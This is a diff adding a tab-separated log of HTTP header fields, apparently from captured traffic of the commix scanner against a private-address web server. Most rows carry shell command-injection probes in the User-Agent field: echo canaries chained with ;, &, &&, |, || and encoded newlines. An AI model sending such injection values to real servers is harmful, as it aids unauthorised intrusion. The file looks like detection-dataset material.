@@ -1,0 +1,791 @@
+http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			commix/v3.3-stable (https://commixproject.com)				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			commix/v3.3-stable (https://commixproject.com)				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			commix/v3.3-stable (https://commixproject.com)				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			commix/v3.3-stable (https://commixproject.com)				/web/
+	identity																close										192.168.1.104															1	http://192.168.1.104/web/		HEAD				HTTP/1.1																			Python-urllib/3.9				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			INJECT_HERE				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			INJECT_HERE				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			INJECT_HERE				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			INJECT_HERE				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			INJECT_HERE				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			INJECT_HERE				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			INJECT_HERE				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			INJECT_HERE				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			INJECT_HERE				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			INJECT_HERE				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			INJECT_HERE				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			INJECT_HERE				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			INJECT_HERE				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			INJECT_HERE				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			INJECT_HERE				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			INJECT_HERE				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			INJECT_HERE				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			INJECT_HERE				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			INJECT_HERE				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			INJECT_HERE				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			INJECT_HERE				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo IWDGRA$((51+46))$(echo IWDGRA)IWDGRA				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo IWDGRA$((51+46))$(echo IWDGRA)IWDGRA				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo IWDGRA$((51+46))$(echo IWDGRA)IWDGRA				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo IWDGRA$((51+46))$(echo IWDGRA)IWDGRA				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo FQOZPE$((12+79))$(echo FQOZPE)FQOZPE				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo FQOZPE$((12+79))$(echo FQOZPE)FQOZPE				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo FQOZPE$((12+79))$(echo FQOZPE)FQOZPE				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo FQOZPE$((12+79))$(echo FQOZPE)FQOZPE				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo SYGTXY$((76+36))$(echo SYGTXY)SYGTXY				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo SYGTXY$((76+36))$(echo SYGTXY)SYGTXY				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo SYGTXY$((76+36))$(echo SYGTXY)SYGTXY				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo SYGTXY$((76+36))$(echo SYGTXY)SYGTXY				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo DPJKQS$((3+0))$(echo DPJKQS)DPJKQS				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo DPJKQS$((3+0))$(echo DPJKQS)DPJKQS				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo DPJKQS$((3+0))$(echo DPJKQS)DPJKQS				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo DPJKQS$((3+0))$(echo DPJKQS)DPJKQS				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo ZLQMTC$((17+0))$(echo ZLQMTC)ZLQMTC				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo ZLQMTC$((17+0))$(echo ZLQMTC)ZLQMTC				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo ZLQMTC$((17+0))$(echo ZLQMTC)ZLQMTC				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo ZLQMTC$((17+0))$(echo ZLQMTC)ZLQMTC				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo DXDYNB$((23+97))$(echo DXDYNB)DXDYNB				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo DXDYNB$((23+97))$(echo DXDYNB)DXDYNB				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo DXDYNB$((23+97))$(echo DXDYNB)DXDYNB				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo DXDYNB$((23+97))$(echo DXDYNB)DXDYNB				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo SLBILR$((53+4))$(echo SLBILR)SLBILR				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo SLBILR$((53+4))$(echo SLBILR)SLBILR				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo SLBILR$((53+4))$(echo SLBILR)SLBILR				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo SLBILR$((53+4))$(echo SLBILR)SLBILR				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo EOHNTV$((56+14))$(echo EOHNTV)EOHNTV				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo EOHNTV$((56+14))$(echo EOHNTV)EOHNTV				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo EOHNTV$((56+14))$(echo EOHNTV)EOHNTV				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo EOHNTV$((56+14))$(echo EOHNTV)EOHNTV				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo EEHMDT$((32+85))$(echo EEHMDT)EEHMDT				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo EEHMDT$((32+85))$(echo EEHMDT)EEHMDT				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo EEHMDT$((32+85))$(echo EEHMDT)EEHMDT				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo EEHMDT$((32+85))$(echo EEHMDT)EEHMDT				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo RYHBLL$((87+25))$(echo RYHBLL)RYHBLL				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo RYHBLL$((87+25))$(echo RYHBLL)RYHBLL				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo RYHBLL$((87+25))$(echo RYHBLL)RYHBLL				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo RYHBLL$((87+25))$(echo RYHBLL)RYHBLL				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo LRRDPN$((78+26))$(echo LRRDPN)LRRDPN				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo LRRDPN$((78+26))$(echo LRRDPN)LRRDPN				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo LRRDPN$((78+26))$(echo LRRDPN)LRRDPN				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo LRRDPN$((78+26))$(echo LRRDPN)LRRDPN				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo RZRCLT$((39+94))$(echo RZRCLT)RZRCLT				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo RZRCLT$((39+94))$(echo RZRCLT)RZRCLT				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo RZRCLT$((39+94))$(echo RZRCLT)RZRCLT				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo RZRCLT$((39+94))$(echo RZRCLT)RZRCLT				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho OUSOSP$((1+72))$(echo OUSOSP)OUSOSP				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho OUSOSP$((1+72))$(echo OUSOSP)OUSOSP				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho OUSOSP$((1+72))$(echo OUSOSP)OUSOSP				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho OUSOSP$((1+72))$(echo OUSOSP)OUSOSP				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho IFHHUR$((29+81))$(echo IFHHUR)IFHHUR				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho IFHHUR$((29+81))$(echo IFHHUR)IFHHUR				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho IFHHUR$((29+81))$(echo IFHHUR)IFHHUR				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho IFHHUR$((29+81))$(echo IFHHUR)IFHHUR				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo HKLNNH$((37+84))$(echo HKLNNH)HKLNNH'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo HKLNNH$((37+84))$(echo HKLNNH)HKLNNH'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo HKLNNH$((37+84))$(echo HKLNNH)HKLNNH'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo HKLNNH$((37+84))$(echo HKLNNH)HKLNNH'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo UUWIWN$((2+69))$(echo UUWIWN)UUWIWN'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo UUWIWN$((2+69))$(echo UUWIWN)UUWIWN'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo UUWIWN$((2+69))$(echo UUWIWN)UUWIWN'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo UUWIWN$((2+69))$(echo UUWIWN)UUWIWN'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo KVRNKU$((39+98))$(echo KVRNKU)KVRNKU'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo KVRNKU$((39+98))$(echo KVRNKU)KVRNKU'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo KVRNKU$((39+98))$(echo KVRNKU)KVRNKU'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo KVRNKU$((39+98))$(echo KVRNKU)KVRNKU'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo EJEKJL$((38+42))$(echo EJEKJL)EJEKJL'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo EJEKJL$((38+42))$(echo EJEKJL)EJEKJL'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo EJEKJL$((38+42))$(echo EJEKJL)EJEKJL'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo EJEKJL$((38+42))$(echo EJEKJL)EJEKJL'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo YFDLVH$((84+16))$(echo YFDLVH)YFDLVH'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo YFDLVH$((84+16))$(echo YFDLVH)YFDLVH'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo YFDLVH$((84+16))$(echo YFDLVH)YFDLVH'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo YFDLVH$((84+16))$(echo YFDLVH)YFDLVH'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo YZTMXH$((49+6))$(echo YZTMXH)YZTMXH'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo RQVAQF$((64+39))$(echo RQVAQF)RQVAQF'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo RQVAQF$((64+39))$(echo RQVAQF)RQVAQF'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo RQVAQF$((64+39))$(echo RQVAQF)RQVAQF'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo RQVAQF$((64+39))$(echo RQVAQF)RQVAQF'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo QHEEUR$((73+70))$(echo QHEEUR)QHEEUR'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo QHEEUR$((73+70))$(echo QHEEUR)QHEEUR'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo QHEEUR$((73+70))$(echo QHEEUR)QHEEUR'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo QHEEUR$((73+70))$(echo QHEEUR)QHEEUR'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo THSKET$((73+38))$(echo THSKET)THSKET'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo THSKET$((73+38))$(echo THSKET)THSKET'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo THSKET$((73+38))$(echo THSKET)THSKET'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo THSKET$((73+38))$(echo THSKET)THSKET'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo HFGZFK$((54+7))$(echo HFGZFK)HFGZFK'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo XPWGBS$((55+31))$(echo XPWGBS)XPWGBS'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo XPWGBS$((55+31))$(echo XPWGBS)XPWGBS'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo XPWGBS$((55+31))$(echo XPWGBS)XPWGBS'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo XPWGBS$((55+31))$(echo XPWGBS)XPWGBS'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo MSBECY$((18+45))$(echo MSBECY)MSBECY'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo MSBECY$((18+45))$(echo MSBECY)MSBECY'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho ZBODIF$((37+15))$(echo ZBODIF)ZBODIF'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho ZBODIF$((37+15))$(echo ZBODIF)ZBODIF'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho ZBODIF$((37+15))$(echo ZBODIF)ZBODIF'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho ZBODIF$((37+15))$(echo ZBODIF)ZBODIF'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho CEJZYZ$((99+28))$(echo CEJZYZ)CEJZYZ'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho CEJZYZ$((99+28))$(echo CEJZYZ)CEJZYZ'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho CEJZYZ$((99+28))$(echo CEJZYZ)CEJZYZ'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho CEJZYZ$((99+28))$(echo CEJZYZ)CEJZYZ'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo SARDMG$((58+18))$(echo SARDMG)SARDMG"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo SARDMG$((58+18))$(echo SARDMG)SARDMG"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo SARDMG$((58+18))$(echo SARDMG)SARDMG"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo SARDMG$((58+18))$(echo SARDMG)SARDMG"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo KIQJEV$((76+67))$(echo KIQJEV)KIQJEV"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo KIQJEV$((76+67))$(echo KIQJEV)KIQJEV"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo KIQJEV$((76+67))$(echo KIQJEV)KIQJEV"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo KIQJEV$((76+67))$(echo KIQJEV)KIQJEV"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo ERSKMN$((48+40))$(echo ERSKMN)ERSKMN"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo ERSKMN$((48+40))$(echo ERSKMN)ERSKMN"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo ERSKMN$((48+40))$(echo ERSKMN)ERSKMN"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo ERSKMN$((48+40))$(echo ERSKMN)ERSKMN"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo VQVIYO$((8+63))$(echo VQVIYO)VQVIYO"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo VQVIYO$((8+63))$(echo VQVIYO)VQVIYO"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo VQVIYO$((8+63))$(echo VQVIYO)VQVIYO"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo VQVIYO$((8+63))$(echo VQVIYO)VQVIYO"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo POPTHJ$((36+97))$(echo POPTHJ)POPTHJ"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo POPTHJ$((36+97))$(echo POPTHJ)POPTHJ"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo POPTHJ$((36+97))$(echo POPTHJ)POPTHJ"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo POPTHJ$((36+97))$(echo POPTHJ)POPTHJ"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo PTLNKM$((75+5))$(echo PTLNKM)PTLNKM"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo PTLNKM$((75+5))$(echo PTLNKM)PTLNKM"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo PTLNKM$((75+5))$(echo PTLNKM)PTLNKM"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo PTLNKM$((75+5))$(echo PTLNKM)PTLNKM"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo BCSVXS$((3+23))$(echo BCSVXS)BCSVXS"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo BCSVXS$((3+23))$(echo BCSVXS)BCSVXS"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo BCSVXS$((3+23))$(echo BCSVXS)BCSVXS"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo BCSVXS$((3+23))$(echo BCSVXS)BCSVXS"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo GCCGJN$((16+78))$(echo GCCGJN)GCCGJN"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo GCCGJN$((16+78))$(echo GCCGJN)GCCGJN"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo GCCGJN$((16+78))$(echo GCCGJN)GCCGJN"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo GCCGJN$((16+78))$(echo GCCGJN)GCCGJN"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo MHPMRE$((30+76))$(echo MHPMRE)MHPMRE"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo MHPMRE$((30+76))$(echo MHPMRE)MHPMRE"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo MHPMRE$((30+76))$(echo MHPMRE)MHPMRE"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo MHPMRE$((30+76))$(echo MHPMRE)MHPMRE"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo QOAPUD$((95+46))$(echo QOAPUD)QOAPUD"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo QOAPUD$((95+46))$(echo QOAPUD)QOAPUD"				/web/
